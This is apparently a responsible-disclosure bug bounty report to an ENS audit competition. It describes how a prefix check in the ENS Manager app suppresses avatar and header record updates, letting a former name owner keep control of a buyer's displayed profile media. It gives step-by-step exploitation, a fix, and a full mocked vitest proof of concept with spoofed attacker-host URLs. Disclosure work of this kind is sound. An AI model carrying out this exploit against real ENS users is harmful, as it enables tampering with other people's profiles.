# 91233 w a low manager suppresses a cross name avatar header record update and preserves former owner media control

**Submitted on Aug 30th 2026 at 20:07:31 UTC by @crypt0n1337 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91233
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Changing details of other users (including modifying browser local storage) without already-connected wallet interaction and with significant user interaction, such as:
    * Iframing leading to modifying the backend/browser state (must demonstrate impact with PoC)

## Description

## Triage summary

* **Program:** Audit Competition | ENS
* **Asset:** Manager app Files (`apps/manager`)
* **Frozen target:** `cda79acaad59711b943fc68207ebb3f1d0ff8596`
* **Submission type:** BUG
* **Primary listed impact:** **Low 53 — changing another user's details after significant user interaction**
* **Severity ceiling:** Low. Do not claim Medium or Critical.
* **PoC:** 1 file, 12 tests, all passing
* **Live activity:** none. The PoC is hermetic at the wallet, RPC, resolver, and upload-worker boundaries.

## Summary

Manager treats any two avatar/header strings beginning with the hardcoded ENS upload-worker base as the same gasless image object. It does not compare the network, ENS name, image kind, or even the complete URL.

This creates a deterministic post-sale authority failure using only official ENS URLs. Before selling `acquired-name.eth`, Mallory sets its records to the official objects for a second name she keeps:

```
avatar = https://avatar-upload-staging.ens-cf.workers.dev/sepolia/attacker-owned.eth
header = https://avatar-upload-staging.ens-cf.workers.dev/sepolia/attacker-owned.eth/h
```

Alice then acquires `acquired-name.eth` through a normal secondary sale and uses Manager's ordinary **Edit profile -> Upload -> Save** flow. Manager correctly prepares and successfully uploads Alice's files to:

```
https://avatar-upload-staging.ens-cf.workers.dev/sepolia/acquired-name.eth
https://avatar-upload-staging.ens-cf.workers.dev/sepolia/acquired-name.eth/h
```

However, `createDiff()` suppresses both changed record strings because all four URLs start with the same base. The form classifies the operation as image-only. Alice signs both expected EIP-712 uploads and both official PUTs succeed, but Manager never calls either record-writing path. A clean resolver reread therefore still returns Mallory's two `attacker-owned.eth` URLs.

Mallory remains the legitimate owner of `attacker-owned.eth`, so she can later sign a normal upload for that name and overwrite the exact official objects that Alice's profile still resolves and Manager renders. Mallory needs no role, approval, resolver authority, wallet access, or retained permission on `acquired-name.eth`.

## Ordinary actor story

{% stepper %}
{% step %}

## Mallory owns both names

Mallory owns `acquired-name.eth` and `attacker-owned.eth`.
{% endstep %}

{% step %}

## Mallory uploads media for the retained name

Mallory uploads an avatar and header for `attacker-owned.eth` through the official upload worker.
{% endstep %}

{% step %}

## Mallory sets cross-name records

Mallory sets `acquired-name.eth`'s `avatar` and `header` records to those two official cross-name URLs.
{% endstep %}

{% step %}

## Mallory transfers the acquired name

Mallory sells/transfers `acquired-name.eth` normally. Alice becomes its owner; Mallory keeps only `attacker-owned.eth`.
{% endstep %}

{% step %}

## Alice replaces the profile media

Alice opens Manager for `acquired-name.eth`, selects new local files for both media fields, crops them, clicks Save, and signs the two prompted uploads.
{% endstep %}

{% step %}

## Manager completes an image-only save

Both uploads succeed. Manager presents the operation as completed and refreshes its caches, but it submits no ENS record transaction.
{% endstep %}

{% step %}

## Resolver records remain unchanged

A new Manager session or clean resolver reread still obtains the two `attacker-owned.eth` record values.
{% endstep %}

{% step %}

## Mallory replaces the referenced media

Mallory later uploads different bytes to her own official objects. The URLs that Manager renders for Alice's profile have not changed, but the media at those URLs has; Alice's displayed avatar/header changes without her wallet.
{% endstep %}
{% endstepper %}

The significant interaction is disclosed and is why the report selects Low: Alice acquires the name, opens Edit profile, selects/crops files, clicks Save, and signs the uploads. This is not a zero-click or one-click claim.

## Root cause and exact Manager path

### 1. A broad prefix is treated as object identity

`apps/manager/src/features/profile/constants.ts:1-2` defines the base without a trailing slash:

```ts
export const AVATAR_UPLOAD_BASE_URL =
  'https://avatar-upload-staging.ens-cf.workers.dev'
```

`apps/manager/src/features/profile/utils/createDiff.ts:22-24` classifies an arbitrary string with `startsWith()`:

```ts
const isGaslessUploadUrl = (value: unknown): boolean => {
  const normalizedValue = toNormalizedString(value)
  return normalizedValue.startsWith(AVATAR_UPLOAD_BASE_URL)
}
```

At `createDiff.ts:208-218`, the ignore predicate suppresses an avatar or header change whenever both old and new values pass that classifier:

```ts
({ key, originalValue, currentValue }) =>
  (key === 'avatar' || key === 'header') &&
  isGaslessUploadUrl(originalValue) &&
  isGaslessUploadUrl(currentValue)
```

The predicate receives only the two record values. It does not bind the old URL to the current `{chain, name, kind}`. Origin validation alone would not fix the primary exploit because the attacker-name and victim-name objects share the same legitimate origin.

### 2. The form remains saveable but declares that no record changed

`EditProfileDialogBody.tsx:73-86` creates the diff independently from the list of prepared signed uploads. At lines 96-101 a prepared upload keeps Save enabled even when the diff is empty. Lines 122-126 send:

```ts
onSave(submittedValues, {
  hasRecordChanges: hasChanges,
  preparedImageUploads: activePreparedImageUploads,
})
```

For the cross-name fixture this becomes `hasRecordChanges: false` with active avatar and header uploads.

### 3. Signed uploads succeed before the save path returns as image-only

`profileImageUpload.ts:74-101` constructs Sepolia endpoints that are correctly bound to Alice's current name. Lines 108-141 bind the upload signature to the kind, expiry, name, and content hash. Lines 143-162 issue the official PUT, and lines 206-231 sign and submit each prepared upload.

`useEditProfileDialogSave.ts:312-325` submits every prepared upload. But lines 490-518 create a pending record save only when `hasRecordChanges` is true; lines 455-468 then finalize and return early for a successful image-only save. Consequently neither `saveRecords` nor `setupControlledResolver` runs.

The finalizer resets the form to the submitted values, calls the profile update callback, refreshes image caches, clears prepared uploads, and closes the dialog (`useEditProfileDialogSave.ts:336-350`). Cache refresh cannot repair an ENS record that Manager never wrote.

### 4. A clean Manager read still selects Mallory's object

`profileRecords.ts:109-139` reads text records through the resolver-backed `getRecords()` call; `profileRecords.ts:165-169` exposes that as the Manager profile query. After this bug, an authoritative reread returns the unchanged cross-name values.

The edit-profile rendering path is direct:

* `GeneralTab.tsx:245-277` passes the resolver-backed `values.base.avatar/header` as `currentImage`;
* `useProfileImageField.ts:69-78` uses `currentImage` when no local preview or image-query result supersedes it;
* `ProfileImageField.tsx:137-152` forwards that value to the normal preview;
* `ProfileImagePreview.tsx:16-29,54-84` places it in the actual image `src`.

The public Manager profile also consumes the same resolver records and renders images. `ProfileView.tsx:93-96` reads the records; lines 139-165 and 192-210 construct and pass avatar/header endpoints for the current victim name; `ProfileAvatar.tsx:28-33` and `ProfileBanner.tsx:18-23` render them. The PoC's direct DOM assertion uses the edit-profile surface, where the persisted raw record URL is observable without depending on a metadata-service model.

This is the direct in-scope consequence: Manager's successful save leaves its own profile view bound to media controlled by a former owner. The upload worker is not alleged to be vulnerable; it is only the legitimate mutable object store selected by Manager's unchanged record.

## Why Mallory can legitimately replace the referenced bytes

The first-party avatar-worker source corroborates the normal mutation primitive at commit [`40a639f6`](https://github.com/ensdomains/ens-avatar-worker/tree/40a639f614d5116b4d90c019bfe59c15de513fd4):

* the [avatar PUT route](https://github.com/ensdomains/ens-avatar-worker/blob/40a639f614d5116b4d90c019bfe59c15de513fd4/src/routes/avatar.ts#L80-L157) reads `/:name`, verifies the name-bound signature and live owner, and writes the registered media object;
* the [header PUT route](https://github.com/ensdomains/ens-avatar-worker/blob/40a639f614d5116b4d90c019bfe59c15de513fd4/src/routes/header.ts#L75-L145) does the same for `/:name/h`;
* the [typed-data helper](https://github.com/ensdomains/ens-avatar-worker/blob/40a639f614d5116b4d90c019bfe59c15de513fd4/src/utils/eth.ts#L5-L56) binds the upload kind, expiry, name, and hash;
* the [media-key helper](https://github.com/ensdomains/ens-avatar-worker/blob/40a639f614d5116b4d90c019bfe59c15de513fd4/src/utils/media.ts#L6-L13) keys registered media by network and name.

Mallory's later PUT is therefore expected and correctly authorized for the separate name she still owns. The security error is Manager's failure to sever that reference after Alice explicitly replaced it.

## Impact

Use only **Low 53 — changing another user's details after significant user interaction**.

After Alice completes the normal replacement flow, Mallory can change the avatar/header rendered for Alice's acquired ENS profile without Alice's wallet, signature, role, or record permission. Recovery is possible by manually replacing or clearing the ENS records through a path that actually sends a record transaction, which is consistent with Low.

The report does **not** claim that Mallory writes Alice's ENS text record. The record remains unchanged. The precise impact is retained control of Alice's resolved/displayed profile media through the wrong official cross-name object binding.

Medium's up-to-one-click interaction bound is not met honestly: acquisition, Edit profile, file selection/cropping, Save, and upload signatures are significant interaction. No financial loss, private-key compromise, or irreversible Critical consequence is claimed.

## Known-issue and scope boundary

`WEB-567` publicly describes stale or inconsistent avatar/header saves, so the symptom overlap must be disclosed. The private ticket root is unavailable.

The strongest official public primary source for that cache family is ENS's [`METADATA_CACHE_OPTIMIZATION.md`](https://github.com/ensdomains/ens-app-v3/blob/41d4668904765230078961e8d507cf2f192421f4/METADATA_CACHE_OPTIMIZATION.md):

* [lines 3-36](https://github.com/ensdomains/ens-app-v3/blob/41d4668904765230078961e8d507cf2f192421f4/METADATA_CACHE_OPTIMIZATION.md#L3-L36) define the problem as overbroad metadata cache-busting after profile record transactions;
* [lines 158-212](https://github.com/ensdomains/ens-app-v3/blob/41d4668904765230078961e8d507cf2f192421f4/METADATA_CACHE_OPTIMIZATION.md#L158-L212) keep actual record-transaction construction and add targeted cache busting;
* [lines 215-237](https://github.com/ensdomains/ens-app-v3/blob/41d4668904765230078961e8d507cf2f192421f4/METADATA_CACHE_OPTIMIZATION.md#L215-L237) retain React Query invalidation after transaction completion;
* [lines 590-603](https://github.com/ensdomains/ens-app-v3/blob/41d4668904765230078961e8d507cf2f192421f4/METADATA_CACHE_OPTIMIZATION.md#L590-L603) state that upload flows already work correctly and should remain unchanged;
* [lines 619-629](https://github.com/ensdomains/ens-app-v3/blob/41d4668904765230078961e8d507cf2f192421f4/METADATA_CACHE_OPTIMIZATION.md#L619-L629) require avatar/header updates to work and appear immediately.

This public document cannot prove every private detail of `WEB-567`, but it establishes a concrete root boundary. The cache family assumes a real profile record transaction and changes cache timestamps/invalidation. This finding suppresses the record transaction before construction. It survives cache clearing, a new session, and an authoritative resolver reread. Its fix is URL identity binding, not cache invalidation.

The candidate is also distinct from:

* `R2-04` (Portal OG-worker SSRF): no attacker host or server-side fetch bypass is required;
* `SEC-MGR-010` (upload EIP-712 domain fields): no forgery or replay is used;
* `EXP-INPUT-008` (JPEG EXIF/GPS retention): image metadata is irrelevant;
* the NFT/metadata-service exclusion: both records are plain HTTPS text values, and no NFT path is used;
* closed `#90071`'s out-of-scope-only consequence: the wrong poststate here is read and rendered by the in-scope Manager itself.

See `DEDUPE.md` for the full closure matrix.

## Recommended fix

The simplest safe change is to remove the special “both are gasless upload URLs” ignore predicate. Exact equality is already handled earlier by the diff logic, so replacing the bytes at the same official object remains image-only. Any different record string should produce a record transaction.

If the optimization must remain, parse the URL and require the exact expected endpoint for the current `{chain, normalized current name, kind}`. At minimum:

```
avatar: https://.../{network}/{current-name}
header: https://.../{network}/{current-name}/h
```

Do not use origin equality as the security boundary; the primary exploit uses the correct origin. Apply the same strict parser to `profileImageCache.ts` as defense in depth, because it repeats the broad `startsWith()` classifier.

Add regressions for:

* cross-name official avatar -> current-name official avatar;
* cross-name official header -> current-name official header;
* cross-network paths;
* avatar/header kind swaps;
* attacker-origin prefix strings; and
* exact same-object content replacement as the passing negative control.

## Proof of Concept

Create this file in the frozen competition repository:

```
apps/manager/audit-artifacts/profile-image-origin-prefix-20260830/profile-image-origin-prefix.poc.test.tsx
```

Run from `apps/manager`:

```powershell
.\node_modules\.bin\vitest.cmd run `
  audit-artifacts/profile-image-origin-prefix-20260830/profile-image-origin-prefix.poc.test.tsx `
  --reporter=verbose
```

Expected result:

```
Test Files  1 passed (1)
Tests       12 passed (12)
```

The test executes the real frozen `createDiff`, a real TanStack-form-wrapped `EditProfileDialogBody`, the real `useEditProfileDialogSave`, the real `submitPreparedProfileImageUpload`, and the real `ProfileImagePreview` DOM component. Wallet, chain/RPC, resolver state, and worker storage are modeled at their external boundaries; no live service is contacted.

The passing assertions prove:

1. both avatar and header cross-name official paths collapse to an empty diff;
2. the real form emits an enabled image-only save with `hasRecordChanges: false`;
3. Alice signs and PUTs both correct `acquired-name.eth` objects;
4. neither possible ENS record writer is called;
5. a clean resolver-state reread remains the two `attacker-owned.eth` URLs;
6. real Manager preview components render those URLs for `acquired-name.eth`;
7. Mallory's legitimate, name-bound PUTs replace the bytes behind the exact rendered `src` values while Alice's records remain unchanged;
8. an ordinary external URL is not suppressed;
9. same-object replacement remains a safe negative control; and
10. origin equality is insufficient while exact expected-path binding rejects the cross-name object.

SHA-256 of the PoC:

```
6C2C258383BB88BD9DB5087D60010D9F988CB4FFD40075E867E102FCF3772C2F
```

## Complete PoC source

```tsx
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import {
  act,
  fireEvent,
  render,
  renderHook,
  screen,
  waitFor,
} from '@testing-library/react'
import type { ReactNode } from 'react'
import type { Address } from 'viem'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { EditProfileDialogBody } from '@/features/profile/components/dialogs/edit-profile/EditProfileDialogBody'
import { ProfileImagePreview } from '@/features/profile/components/dialogs/edit-profile/tabs/general/ProfileImagePreview'
import { useEditProfileDialogSave } from '@/features/profile/components/dialogs/edit-profile/useEditProfileDialogSave'
import { useAppForm } from '@/features/profile/components/form'
import { AVATAR_UPLOAD_BASE_URL } from '@/features/profile/constants'
import {
  buildNameAvatarUrl,
  buildNameHeaderUrl,
} from '@/features/profile/service/profileAvatar'
import {
  type PreparedProfileImageUpload,
  submitPreparedProfileImageUpload,
} from '@/features/profile/service/profileImageUpload'
import type { ProfileRecords } from '@/features/profile/types'
import { createDiff } from '@/features/profile/utils/createDiff'
import { newEmptyProfileRecords } from '@/features/profile/utils/transformRecords'

const saveRecordsMock = vi.hoisted(() => vi.fn())
const setupControlledResolverMock = vi.hoisted(() => vi.fn())
const signTypedDataAsyncMock = vi.hoisted(() => vi.fn())

vi.mock('@/features/profile/service/profileRecordTransactions', () => ({
  saveRecords: saveRecordsMock,
}))

vi.mock('@/features/profile/service/setupControlledResolver', () => ({
  setupControlledResolver: setupControlledResolverMock,
}))

vi.mock('@/features/profile/service/resolverWriteAccess', () => ({
  resolverWriteAccessQuery: () => ({
    queryKey: ['profile', 'resolver_write_access'],
    queryFn: async () => true,
  }),
}))

vi.mock('@/lib/smart-account', () => ({
  useSmartAccountContext: () => ({
    accountAddress: null,
    ownerAddress: null,
    signer: null,
    walletClient: null,
  }),
}))

vi.mock('@/lib/wagmi', () => ({ publicClient: {} }))

vi.mock('wagmi', () => ({
  useAccount: () => ({
    address: '0x000000000000000000000000000000000000bEEF',
    isConnected: true,
  }),
  useChainId: () => 11155111,
  useSignTypedData: () => ({ signTypedDataAsync: signTypedDataAsyncMock }),
}))

vi.mock('@/components/ui/tabs', () => ({
  Tabs: ({ children }: { readonly children: ReactNode }) => (
    <div>{children}</div>
  ),
}))

vi.mock(
  '@/features/profile/components/dialogs/edit-profile/EditProfileDialogHeader',
  () => ({
    EditProfileDialogHeader: ({
      canSave,
      onSave,
    }: {
      readonly canSave: boolean
      readonly onSave: () => void
    }) => (
      <button disabled={!canSave} onClick={onSave} type="button">
        Save
      </button>
    ),
  }),
)

vi.mock(
  '@/features/profile/components/dialogs/edit-profile/EditProfileDialogTabs',
  () => ({ EditProfileDialogTabs: () => null }),
)

const victimName = 'acquired-name.eth'
const attackerName = 'attacker-owned.eth'
const attackerOriginAvatar =
  'https://avatar-upload-staging.ens-cf.workers.dev.attacker.example/avatar.jpg'
const attackerOriginHeader =
  'https://avatar-upload-staging.ens-cf.workers.dev.attacker.example/header.jpg'
const victimOfficialAvatar = `${AVATAR_UPLOAD_BASE_URL}/sepolia/${victimName}`
const victimOfficialHeader = `${AVATAR_UPLOAD_BASE_URL}/sepolia/${victimName}/h`
const attackerOfficialAvatar = `${AVATAR_UPLOAD_BASE_URL}/sepolia/${attackerName}`
const attackerOfficialHeader = `${AVATAR_UPLOAD_BASE_URL}/sepolia/${attackerName}/h`

const savedAfterSecondarySale = (): ProfileRecords => ({
  ...newEmptyProfileRecords(),
  base: {
    avatar: attackerOfficialAvatar,
    header: attackerOfficialHeader,
  },
})

const victimSubmittedRecords = (): ProfileRecords => ({
  ...newEmptyProfileRecords(),
  base: {
    avatar: victimOfficialAvatar,
    header: victimOfficialHeader,
  },
})

const preparedUpload = ({
  dataURL = 'data:image/jpeg;base64,AQID',
  hash,
  kind,
  name = victimName,
}: {
  readonly dataURL?: string
  readonly hash?: string
  readonly kind: 'avatar' | 'header'
  readonly name?: string
}): PreparedProfileImageUpload => ({
  dataURL,
  hash: hash ?? `${name}-${kind}-hash`,
  imageUrl: `${AVATAR_UPLOAD_BASE_URL}/sepolia/${name}${kind === 'header' ? '/h' : ''}`,
  kind,
  name,
})

const FormDecisionHarness = ({
  onSave,
}: {
  readonly onSave: ReturnType<typeof vi.fn>
}) => {
  const form = useAppForm({ defaultValues: victimSubmittedRecords() })

  return (
    <EditProfileDialogBody
      form={form}
      isFinalizingImageSave={false}
      isResolverAccessPending={false}
      name={victimName}
      onImageUploadPrepared={() => {}}
      onSave={onSave}
      open
      preparedImageUploads={[
        preparedUpload({ kind: 'avatar' }),
        preparedUpload({ kind: 'header' }),
      ]}
      savedRecords={savedAfterSecondarySale()}
    />
  )
}

const createWrapper = (queryClient: QueryClient) =>
  function Wrapper({ children }: { readonly children: ReactNode }) {
    return (
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    )
  }

describe('Manager profile image upload origin-prefix confusion PoC', () => {
  beforeEach(() => {
    saveRecordsMock.mockReset()
    setupControlledResolverMock.mockReset()
    signTypedDataAsyncMock.mockReset()
    signTypedDataAsyncMock.mockResolvedValue('0x1234')
  })

  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it.each([
    ['avatar', attackerOriginAvatar, victimOfficialAvatar],
    ['header', attackerOriginHeader, victimOfficialHeader],
  ] as const)('suppresses the %s record change when an attacker hostname starts with the official base string', (kind, attackerUrl, officialUrl) => {
    expect(AVATAR_UPLOAD_BASE_URL).toBe(
      'https://avatar-upload-staging.ens-cf.workers.dev',
    )
    expect(AVATAR_UPLOAD_BASE_URL.endsWith('/')).toBe(false)
    expect(attackerUrl.startsWith(AVATAR_UPLOAD_BASE_URL)).toBe(true)
    expect(new URL(attackerUrl).origin).not.toBe(
      new URL(AVATAR_UPLOAD_BASE_URL).origin,
    )

    const before = newEmptyProfileRecords()
    before.base = { [kind]: attackerUrl }
    const after = newEmptyProfileRecords()
    after.base = { ...after.base, [kind]: officialUrl }

    expect(createDiff(before, after)).toEqual({})
  })

  it.each([
    ['avatar', attackerOfficialAvatar, victimOfficialAvatar],
    ['header', attackerOfficialHeader, victimOfficialHeader],
  ] as const)('suppresses the stronger cross-name official %s path replacement', (kind, attackerPath, victimPath) => {
    expect(new URL(attackerPath).origin).toBe(new URL(victimPath).origin)
    expect(new URL(attackerPath).pathname).not.toBe(
      new URL(victimPath).pathname,
    )

    const before = newEmptyProfileRecords()
    before.base = { [kind]: attackerPath }
    const after = newEmptyProfileRecords()
    after.base = { [kind]: victimPath }

    expect(createDiff(before, after)).toEqual({})
  })

  it('passes the real form decision as an image-only save with no record changes', () => {
    const onSave = vi.fn()
    render(<FormDecisionHarness onSave={onSave} />)

    const saveButton = screen.getByRole('button', { name: 'Save' })
    expect((saveButton as HTMLButtonElement).disabled).toBe(false)
    fireEvent.click(saveButton)

    expect(onSave).toHaveBeenCalledWith(victimSubmittedRecords(), {
      hasRecordChanges: false,
      preparedImageUploads: [
        preparedUpload({ kind: 'avatar' }),
        preparedUpload({ kind: 'header' }),
      ],
    })
  })

  it('signs and uploads both official images but never invokes an onchain record save', async () => {
    const fetchMock = vi.fn(async () => ({
      ok: true,
      json: async () => ({ message: 'uploaded' }),
    }))
    vi.stubGlobal('fetch', fetchMock)

    const queryClient = new QueryClient({
      defaultOptions: { queries: { retry: false } },
    })
    const dialogActor = {
      getSnapshot: vi.fn(),
      send: vi.fn(),
    }
    const form = { reset: vi.fn() }
    const currentRecords = victimSubmittedRecords()
    const uploads = [
      preparedUpload({ kind: 'avatar' }),
      preparedUpload({ kind: 'header' }),
    ]
    let resolverState = savedAfterSecondarySale()
    let recordsAfterCleanReload: ProfileRecords | undefined
    saveRecordsMock.mockImplementation(async () => {
      resolverState = currentRecords
    })
    setupControlledResolverMock.mockImplementation(async () => {
      resolverState = currentRecords
    })
    const onUpdated = vi.fn(async () => {
      recordsAfterCleanReload = resolverState
    })

    const { result } = renderHook(
      () =>
        useEditProfileDialogSave({
          dialogActor: dialogActor as never,
          ethAddressChanged: false,
          form,
          isSuccess: false,
          name: victimName,
          onUpdated,
          open: true,
          owner: '0x000000000000000000000000000000000000bEEF' as Address,
          savedRecords: savedAfterSecondarySale(),
        }),
      { wrapper: createWrapper(queryClient) },
    )

    act(() => {
      result.current.handleSave(currentRecords, {
        hasRecordChanges: false,
        preparedImageUploads: uploads,
      })
    })

    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(2))
    await waitFor(() =>
      expect(dialogActor.send).toHaveBeenCalledWith({ type: 'CLOSE' }),
    )

    expect(signTypedDataAsyncMock).toHaveBeenCalledTimes(2)
    expect(fetchMock).toHaveBeenNthCalledWith(
      1,
      victimOfficialAvatar,
      expect.objectContaining({ method: 'PUT' }),
    )
    expect(fetchMock).toHaveBeenNthCalledWith(
      2,
      victimOfficialHeader,
      expect.objectContaining({ method: 'PUT' }),
    )
    expect(saveRecordsMock).not.toHaveBeenCalled()
    expect(setupControlledResolverMock).not.toHaveBeenCalled()
    expect(form.reset).toHaveBeenCalledWith(currentRecords)
    expect(onUpdated).toHaveBeenCalledTimes(1)

    // A clean reload reads the unchanged resolver state because neither
    // record-writing path ran. Both records still point at official worker
    // objects for a different ENS name that the attacker kept after the sale.
    expect(recordsAfterCleanReload?.base).toEqual({
      avatar: attackerOfficialAvatar,
      header: attackerOfficialHeader,
    })

    // The former owner can legitimately authenticate for attacker-owned.eth
    // and replace both referenced objects after the victim owns acquired-name.eth.
    const attackerSignTypedDataAsync = vi.fn().mockResolvedValue('0xabcd')
    await submitPreparedProfileImageUpload({
      address: '0x000000000000000000000000000000000000aAaA',
      signTypedDataAsync: attackerSignTypedDataAsync as never,
      upload: preparedUpload({ kind: 'avatar', name: attackerName }),
    })
    await submitPreparedProfileImageUpload({
      address: '0x000000000000000000000000000000000000aAaA',
      signTypedDataAsync: attackerSignTypedDataAsync as never,
      upload: preparedUpload({ kind: 'header', name: attackerName }),
    })

    expect(attackerSignTypedDataAsync).toHaveBeenCalledTimes(2)
    expect(attackerSignTypedDataAsync).toHaveBeenNthCalledWith(
      1,
      expect.objectContaining({
        message: expect.objectContaining({
          name: attackerName,
          upload: 'avatar',
        }),
      }),
    )
    expect(fetchMock).toHaveBeenNthCalledWith(
      3,
      attackerOfficialAvatar,
      expect.objectContaining({ method: 'PUT' }),
    )
    expect(fetchMock).toHaveBeenNthCalledWith(
      4,
      attackerOfficialHeader,
      expect.objectContaining({ method: 'PUT' }),
    )
  })

  it('anchors the clean-reload poststate to real Manager image components and attacker-replaceable content', async () => {
    class LoadedImage {
      complete = true
      naturalWidth = 1
      src = ''
      addEventListener() {}
      removeEventListener() {}
    }
    vi.stubGlobal('Image', LoadedImage)

    const attackerAvatarV1 = 'data:image/jpeg;base64,bWFsbG9yeS12MQ=='
    const attackerHeaderV1 = 'data:image/jpeg;base64,aGVhZGVyLXYx'
    const attackerAvatarV2 = 'data:image/jpeg;base64,bWFsbG9yeS12Mg=='
    const attackerHeaderV2 = 'data:image/jpeg;base64,aGVhZGVyLXYy'
    const officialObjectBytes = new Map<string, string>([
      [attackerOfficialAvatar, attackerAvatarV1],
      [attackerOfficialHeader, attackerHeaderV1],
    ])

    const fetchMock = vi.fn(
      async (input: string | URL | Request, init?: RequestInit) => {
        const endpoint = input.toString()
        if (init?.method === 'PUT' && typeof init.body === 'string') {
          const body = JSON.parse(init.body) as { dataURL: string }
          officialObjectBytes.set(endpoint, body.dataURL)
        }
        return {
          ok: true,
          json: async () => ({ message: 'uploaded' }),
        }
      },
    )
    vi.stubGlobal('fetch', fetchMock)

    // This is the state returned by Manager's resolver-backed clean reread.
    // Its edit-profile preview feeds these record values directly into the real
    // ImageFallback-backed ProfileImagePreview component.
    const recordsAfterCleanReload = savedAfterSecondarySale()
    render(
      <>
        <ProfileImagePreview
          displayImage={recordsAfterCleanReload.base.avatar}
          hasImage
          kind="avatar"
          name={victimName}
        />
        <ProfileImagePreview
          displayImage={recordsAfterCleanReload.base.header}
          hasImage
          kind="header"
          name={victimName}
        />
      </>,
    )

    const renderedAvatar = await screen.findByAltText(`${victimName} avatar`)
    const renderedHeader = await screen.findByAltText(`${victimName} banner`)
    expect(renderedAvatar.getAttribute('src')).toBe(attackerOfficialAvatar)
    expect(renderedHeader.getAttribute('src')).toBe(attackerOfficialHeader)
    expect(officialObjectBytes.get(attackerOfficialAvatar)).toBe(
      attackerAvatarV1,
    )
    expect(officialObjectBytes.get(attackerOfficialHeader)).toBe(
      attackerHeaderV1,
    )

    // The public Manager profile uses victim-name metadata URLs, while the edit
    // surface above proves the in-scope app's resolver read still binds that
    // victim profile to the attacker's official objects.
    expect(buildNameAvatarUrl(victimName)).toBe(
      'https://ens-metadata-v2.ensdomains.workers.dev/sepolia/avatar/acquired-name.eth',
    )
    expect(buildNameHeaderUrl(victimName)).toBe(
      'https://ens-metadata-v2.ensdomains.workers.dev/sepolia/header/acquired-name.eth',
    )

    const attackerSignTypedDataAsync = vi.fn().mockResolvedValue('0xbeef')
    await submitPreparedProfileImageUpload({
      address: '0x000000000000000000000000000000000000aAaA',
      signTypedDataAsync: attackerSignTypedDataAsync as never,
      upload: preparedUpload({
        dataURL: attackerAvatarV2,
        hash: 'attacker-avatar-v2-hash',
        kind: 'avatar',
        name: attackerName,
      }),
    })
    await submitPreparedProfileImageUpload({
      address: '0x000000000000000000000000000000000000aAaA',
      signTypedDataAsync: attackerSignTypedDataAsync as never,
      upload: preparedUpload({
        dataURL: attackerHeaderV2,
        hash: 'attacker-header-v2-hash',
        kind: 'header',
        name: attackerName,
      }),
    })

    // The legitimate attacker PUTs mutate the exact two URLs that Manager's
    // clean-reloaded victim profile still renders. No victim ENS write occurs.
    expect(
      officialObjectBytes.get(renderedAvatar.getAttribute('src') ?? ''),
    ).toBe(attackerAvatarV2)
    expect(
      officialObjectBytes.get(renderedHeader.getAttribute('src') ?? ''),
    ).toBe(attackerHeaderV2)
    expect(recordsAfterCleanReload.base).toEqual({
      avatar: attackerOfficialAvatar,
      header: attackerOfficialHeader,
    })
  })

  it('keeps the intended same-official-origin overwrite optimization', () => {
    const before = victimSubmittedRecords()
    const after = victimSubmittedRecords()

    expect(new URL(before.base.avatar ?? '').origin).toBe(
      new URL(AVATAR_UPLOAD_BASE_URL).origin,
    )
    expect(createDiff(before, after)).toEqual({})
  })

  it('does not suppress an ordinary external-to-official image change', () => {
    const before = savedAfterSecondarySale()
    before.base = {
      ...before.base,
      avatar:
        'https://attacker.example/avatar-upload-staging.ens-cf.workers.dev.jpg',
    }
    const after = savedAfterSecondarySale()
    after.base = { ...after.base, avatar: victimOfficialAvatar }

    expect(before.base.avatar?.startsWith(AVATAR_UPLOAD_BASE_URL)).toBe(false)
    expect(createDiff(before, after)['Bio: Avatar']).toMatchObject({
      original:
        'https://attacker.example/avatar-upload-staging.ens-cf.workers.dev.jpg',
      current: victimOfficialAvatar,
      type: 'modified',
    })
  })

  it('shows origin validation blocks external prefixes but not the stronger cross-name path collision', () => {
    const sameOfficialOrigin = (value: string) => {
      try {
        return (
          new URL(value.trim()).origin ===
          new URL(AVATAR_UPLOAD_BASE_URL).origin
        )
      } catch {
        return false
      }
    }

    expect(sameOfficialOrigin(victimOfficialAvatar)).toBe(true)
    expect(sameOfficialOrigin(attackerOfficialAvatar)).toBe(true)
    expect(sameOfficialOrigin(attackerOriginAvatar)).toBe(false)
    expect(
      sameOfficialOrigin(
        'https://avatar-upload-staging.ens-cf.workers.dev@attacker.example/avatar.jpg',
      ),
    ).toBe(false)
    expect(
      sameOfficialOrigin(
        'https://attacker.example/avatar-upload-staging.ens-cf.workers.dev.jpg',
      ),
    ).toBe(false)
  })

  it.each([
    ['avatar', attackerOfficialAvatar, victimOfficialAvatar],
    ['header', attackerOfficialHeader, victimOfficialHeader],
  ] as const)('requires the old %s URL to match the current name and kind, not merely the official origin', (_kind, attackerPath, expectedVictimPath) => {
    const isExpectedImageObject = (value: string, expected: string) => {
      try {
        return new URL(value.trim()).href === new URL(expected).href
      } catch {
        return false
      }
    }

    expect(new URL(attackerPath).origin).toBe(
      new URL(expectedVictimPath).origin,
    )
    expect(isExpectedImageObject(attackerPath, expectedVictimPath)).toBe(false)
    expect(isExpectedImageObject(expectedVictimPath, expectedVictimPath)).toBe(
      true,
    )
  })
})
```
